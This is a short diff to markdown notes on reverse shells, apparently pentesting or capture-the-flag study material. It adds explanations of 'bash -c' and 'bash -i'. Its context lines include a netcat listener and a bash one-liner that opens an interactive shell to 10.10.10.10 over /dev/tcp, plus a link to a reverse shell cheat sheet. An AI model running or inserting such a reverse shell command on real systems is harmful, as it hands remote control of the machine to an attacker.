@@ -34,7 +34,8 @@ nc -lvnp 1234
 ```bash
 bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 ```
-- 
+- `bash -c '...'` run commands inside the quotes
+- `bash -i` start interactive shell 
 ## Things to know
 - Command executed depend on the OS of the target
 - [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary) is a reverse shell cheat sheet
